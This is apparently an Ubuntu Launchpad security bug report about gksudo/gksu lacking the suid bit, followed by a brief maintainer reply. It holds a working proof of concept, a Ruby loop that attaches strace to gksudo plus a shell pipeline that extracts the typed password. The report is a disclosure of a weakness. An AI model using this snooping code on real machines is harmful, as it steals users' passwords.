@@ -1,0 +1,28 @@
+Bug #219824: gksudo/gksu should have the suid-bit set
+
+URL: https://bugs.launchpad.net/ubuntu/+source/gksu/+bug/219824
+
+Metadata: security_related=true; information_type=Public Security; targets=gksu (Ubuntu) (Won't Fix, Undecided)
+
+Description:
+I'm wondering why gksudo and gksu haven't set the suidbit like sudo has? Without it one can easily steal the pwd:
+
+#!/usr/bin/env ruby
+loop do
+    gksudo_pid = %x[pgrep -x gksudo]
+    if gksudo_pid !=''
+      system("strace -e trace=write -p #{gksudo_pid}")
+      exit
+    else
+        sleep 1
+    end
+end
+
+$./strace_daemon > /dev/null 2> /tmp/output && grep "write(20" /tmp/output | sed s/write\(20,\ \"/Password:/ | sed s/\\\\n\",.*// && rm /tmp/output
+Password:123456
+
+This doesn't work with sudo but with gksudo/gksu. Is there any reason why these tools aren't secured against such an attack? At least some very primitive anti-debugging patches should be applyed to make it not so easy like it is at the moment to steal the user pwd.
+
+Discussion:
+Message 2 | Author: kees | Subject: Re: gksudo/gksu should have the suid-bit set
+There will always be part of the process tree that can be ptraced for passwords (bash, e.g.).
